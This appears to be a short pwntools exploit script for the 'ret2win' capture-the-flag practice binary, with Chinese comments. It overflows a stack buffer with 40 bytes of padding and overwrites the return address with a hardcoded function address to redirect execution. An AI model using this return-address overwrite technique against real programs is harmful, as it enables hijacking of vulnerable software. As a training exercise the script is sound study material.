from pwn import *

fpath = "./ret2win"
offset = 0x20 + 8  #总长度 50 偏移40 可以使用一条指令
 
p = process(fpath)
elf = ELF(fpath)

if __name__ == '__main__':
	p.recv()

	addr_cmd      	= 0x400824# 可以被替换为 elf.symbols["ret2win"] 但是会多出一个printf操作

	payload = offset * 'a' + p64(addr_cmd)

	p.sendline(payload)
	print p.recv()